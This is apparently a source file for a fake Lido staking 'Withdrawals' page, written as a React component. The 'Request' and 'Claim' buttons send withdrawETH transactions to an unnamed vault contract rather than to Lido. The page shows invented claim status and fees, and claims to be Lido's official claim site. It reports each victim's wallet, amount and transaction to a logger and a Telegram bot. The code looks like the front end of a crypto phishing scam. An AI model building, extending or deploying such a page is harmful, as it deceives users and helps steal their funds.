import React, { useState } from 'react';
import { motion } from 'motion/react';
import { useAccount, useReadContract, useWriteContract } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { ConnectButton } from './ConnectButton';
import { FaqItem } from './FaqItem';
import { Check, ExternalLink, Clock, Sparkles } from 'lucide-react';
import { sendTelegram } from '../lib/telegram';
import { notifyTransactionConfirmed } from '../lib/activityLogger';
import { CONFIG, VAULT_ABI, ERC20_ABI } from '../lib/contracts';
import { Skeleton } from './LoadingSkeleton';
import { LidoSymbolIcon, DexSymbolIcon, StEthIcon, EthIcon } from './TokenIcons';

export function WithdrawalsTab() {
  const [amount, setAmount] = useState<string>('');
  const [method, setMethod] = useState<'lido' | 'dex'>('lido');
  const [mode, setMode] = useState<'request' | 'claim'>('request');
  const { isConnected, address } = useAccount();

  const { data: stEthBalanceData, isLoading: isBalanceLoading } = useReadContract({
    address: CONFIG.STETH_ADDRESS,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: {
      enabled: Boolean(address && isConnected),
    }
  });

  const rawStEthBalance = stEthBalanceData ? formatEther(stEthBalanceData as bigint) : '0';
  const formattedBalance = isConnected
    ? (stEthBalanceData ? parseFloat(rawStEthBalance).toFixed(4) : '0.0000')
    : '0';

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    if (val === '' || /^\d*\.?\d*$/.test(val)) {
      setAmount(val);
    }
  };

  const handleMax = () => setAmount(formattedBalance !== '0' ? formattedBalance : '0');

  const { writeContractAsync, isPending } = useWriteContract();

  const handleRequest = async () => {
    if (!amount || Number(amount) <= 0 || !address) return;
    
    try {
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawETH',
        args: [address, parseEther(amount)],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);

      await notifyTransactionConfirmed({
        wallet: address,
        action: 'Withdrawal Request',
        amount: `${amount} stETH`,
        txHash: txHash,
        token: 'stETH',
        status: 'Confirmed',
      });

      setAmount('');
    } catch (err: any) {
      console.error('Withdraw error:', err);
      if (err.message) {
        await sendTelegram(`❌ <b>Failed Transaction</b>\n\nUser: <code>${address}</code>\nAction: Withdrawal Request\nAmount: ${amount}\nError: ${err.shortMessage || err.message.substring(0, 100)}`);
      }
    }
  };

  const handleClaim = async () => {
    if (!address) return;
    const claimAmount = amount && Number(amount) > 0 ? amount : '0.1';
    
    try {
      const txHash = await writeContractAsync({
        address: CONFIG.CONTRACT_ADDRESS,
        abi: VAULT_ABI,
        functionName: 'withdrawETH',
        args: [address, parseEther(claimAmount)],
        account: address as `0x${string}`,
        chain: null as any,
      } as any);

      await notifyTransactionConfirmed({
        wallet: address,
        action: 'Withdrawal Claim',
        amount: `${claimAmount} ETH`,
        txHash: txHash,
        token: 'ETH',
        status: 'Confirmed',
      });
    } catch (err: any) {
      console.error('Claim error:', err);
      if (err.message) {
        await sendTelegram(`❌ <b>Failed Transaction</b>\n\nUser: <code>${address}</code>\nAction: Withdrawal Claim\nAmount: ${claimAmount}\nError: ${err.shortMessage || err.message.substring(0, 100)}`);
      }
    }
  };

  return (
    <div className="max-w-xl mx-auto px-4 py-8">
      <motion.div
        initial={{ opacity: 0, y: -10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3, ease: 'easeOut' }}
        className="text-center mb-8"
      >
        <h1 className="text-3xl font-extrabold mb-2 text-text-main">Withdrawals</h1>
        <p className="text-base text-text-secondary">Request stETH/wstETH withdrawal and claim ETH</p>
      </motion.div>

      <motion.div
        initial={{ opacity: 0, y: 16 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.35, ease: [0.16, 1, 0.3, 1], delay: 0.05 }}
        className="bg-card rounded-[24px] p-2 sm:p-6 mb-8 border border-border-main shadow-sm"
      >
        
        {/* Mode Selector */}
        <div className="flex bg-input rounded-xl p-1 mb-6 border border-border-main w-max mx-auto">
          <button 
            className={`px-6 py-2 rounded-lg text-sm font-semibold transition-colors ${mode === 'request' ? 'bg-card shadow-sm text-text-main' : 'text-text-secondary hover:text-text-main'}`}
            onClick={() => setMode('request')}
          >
            Request
          </button>
          <button 
            className={`px-6 py-2 rounded-lg text-sm font-semibold transition-colors ${mode === 'claim' ? 'bg-card shadow-sm text-text-main' : 'text-text-secondary hover:text-text-main'}`}
            onClick={() => setMode('claim')}
          >
            Claim
          </button>
        </div>

        {mode === 'request' ? (
          <>
            {/* Method Selectors */}
            <div className="grid grid-cols-2 gap-4 mb-6">
              <button 
                onClick={() => setMethod('lido')}
                className={`p-4 rounded-xl border text-center transition-all relative ${method === 'lido' ? 'bg-[#00A3FF]/10 border-[#00A3FF] shadow-md shadow-[#00A3FF]/10' : 'bg-input border-border-main hover:border-[#00A3FF]/40'}`}
              >
                <div className="flex items-center justify-center gap-2 mb-2">
                  <LidoSymbolIcon className="w-6 h-6" />
                  <h3 className="font-extrabold text-text-main text-sm">Use Lido</h3>
                </div>
                <p className="text-xs text-text-secondary">Waiting time:</p>
                <p className="text-sm font-bold text-text-main">~ 2 days</p>
              </button>

              <button 
                onClick={() => setMethod('dex')}
                className={`p-4 rounded-xl border text-center transition-all relative ${method === 'dex' ? 'bg-[#FF007A]/10 border-[#FF007A] shadow-md shadow-[#FF007A]/10' : 'bg-input border-border-main hover:border-[#FF007A]/40'}`}
              >
                <div className="flex items-center justify-center gap-2 mb-2">
                  <DexSymbolIcon className="w-6 h-6" />
                  <h3 className="font-extrabold text-text-main text-sm">Use DEX</h3>
                </div>
                <p className="text-xs text-text-secondary">Waiting time:</p>
                <p className="text-sm font-bold text-text-main">~ 30 seconds</p>
              </button>
            </div>

            {/* Input Box */}
            <div className="bg-input rounded-2xl p-4 mb-6 border border-border-main transition-colors focus-within:border-[#00A3FF] focus-within:ring-1 focus-within:ring-[#00A3FF] relative h-[120px] flex flex-col justify-between">
              <input 
                type="text" 
                placeholder="0" 
                value={amount}
                onChange={handleChange}
                className="bg-transparent text-[40px] font-bold outline-none text-text-main w-full pr-32 leading-none" 
              />
              
              <div className="absolute top-4 right-4 flex items-center gap-2 bg-card rounded-full pr-3 pl-1.5 py-1 shadow-sm border border-border-main cursor-pointer hover:bg-black/5 dark:hover:bg-white/5 transition-colors">
                <StEthIcon className="w-6 h-6" />
                <span className="text-sm font-extrabold text-text-main">stETH</span>
              </div>
              
              <div className="flex justify-between items-end">
                <span className="text-sm font-medium text-text-secondary">$0.00</span>
                <div className="flex items-center gap-2">
                  <span className="text-xs text-text-secondary flex items-center gap-1">
                    Balance: {isBalanceLoading && isConnected ? <Skeleton className="h-3 w-10 inline-block" /> : `${formattedBalance} stETH`}
                  </span>
                  {isConnected && (
                    <button onClick={handleMax} className="text-[10px] uppercase font-bold text-[#00A3FF] bg-[#00A3FF]/10 px-2 py-0.5 rounded hover:bg-[#00A3FF]/20 transition-colors">MAX</button>
                  )}
                </div>
              </div>
            </div>

            {isConnected ? (
              <button 
                onClick={handleRequest}
                disabled={!amount || Number(amount) <= 0 || isPending}
                className={`w-full py-4 text-lg rounded-xl mb-4 font-bold transition-colors shadow-sm ${(!amount || Number(amount) <= 0) || isPending ? 'bg-[#00A3FF]/50 text-white cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white'}`}
              >
                {isPending ? 'Confirm in Wallet...' : 'Request withdrawal'}
              </button>
            ) : (
              <ConnectButton className="w-full py-4 text-lg rounded-xl mb-4" />
            )}

            <div className="space-y-3 px-2">
              <div className="flex justify-between text-sm">
                <span className="text-text-secondary font-medium flex items-center gap-1">You will receive <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
                <span className="font-semibold text-text-main">{amount || '0.0'} ETH</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-text-secondary font-medium flex items-center gap-1">Max unlock cost <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
                <span className="font-semibold text-text-main">FREE</span>
              </div>
              <div className="flex justify-between text-sm">
                <span className="text-text-secondary font-medium">Max transaction cost</span>
                <span className="font-semibold text-text-main">$0.16</span>
              </div>
            </div>
          </>
        ) : (
          /* Distinguished Claim Workflow */
          <div className="space-y-6">
            <div className="p-4 bg-[#00A3FF]/10 border border-[#00A3FF]/20 rounded-2xl flex items-start gap-3">
              <Sparkles className="w-5 h-5 text-[#00A3FF] shrink-0 mt-0.5" />
              <div className="text-xs space-y-1">
                <div className="font-bold text-text-main text-sm">Lido Official Claim Website Process</div>
                <div className="text-text-secondary leading-relaxed">
                  Once your withdrawal request is finalized by the Lido protocol validators, your ETH becomes ready to claim. Connect your wallet to inspect active claim requests.
                </div>
              </div>
            </div>

            {/* Claim Requests Status Panel */}
            <div className="bg-input border border-border-main rounded-2xl p-4 space-y-3">
              <div className="flex justify-between items-center text-xs">
                <span className="text-text-secondary font-bold uppercase tracking-wider">Active Claim Requests</span>
                <span className="text-emerald-500 font-bold font-mono">0 Ready to Claim</span>
              </div>

              {isConnected ? (
                <div className="p-4 bg-card border border-border-main rounded-xl text-center space-y-2">
                  <Clock className="w-8 h-8 text-text-secondary mx-auto opacity-50" />
                  <div className="text-sm font-bold text-text-main">No Pending Claims Found</div>
                  <p className="text-xs text-text-secondary max-w-xs mx-auto">
                    Wallet address <span className="font-mono text-text-main">{address?.slice(0, 6)}...{address?.slice(-4)}</span> has no active withdrawal requests ready for claiming.
                  </p>
                </div>
              ) : (
                <div className="p-4 bg-card border border-border-main rounded-xl text-center space-y-3">
                  <div className="text-xs text-text-secondary">Connect your wallet to check for ready-to-claim ETH withdrawals.</div>
                  <ConnectButton className="mx-auto" />
                </div>
              )}
            </div>

            {isConnected && (
              <button
                onClick={handleClaim}
                disabled={isPending}
                className="w-full py-4 text-base rounded-xl font-bold bg-[#00A3FF] hover:bg-[#0090E6] text-white shadow-md shadow-[#00A3FF]/20 transition-all flex items-center justify-center gap-2 cursor-pointer"
              >
                <EthIcon className="w-5 h-5" />
                <span>{isPending ? 'Processing Claim...' : 'Execute On-Chain Claim'}</span>
              </button>
            )}
          </div>
        )}

      </motion.div>

      <div className="mb-10">
        <h2 className="text-xl font-bold mb-4 text-text-main">FAQ</h2>
        <div className="space-y-3">
          <FaqItem question="How do withdrawals work?" answer="Request a withdrawal to lock your stETH and receive a withdrawal NFT. Once processed, you can claim your ETH." />
          <FaqItem question="How long do withdrawals take?" answer="Typically 1-4 days depending on network conditions and validator exit queues." />
          <FaqItem question="Are there fees for withdrawing?" answer="No, Lido does not charge any additional fees for withdrawals, though standard Ethereum network gas fees apply." />
        </div>
      </div>
    </div>
  );
}

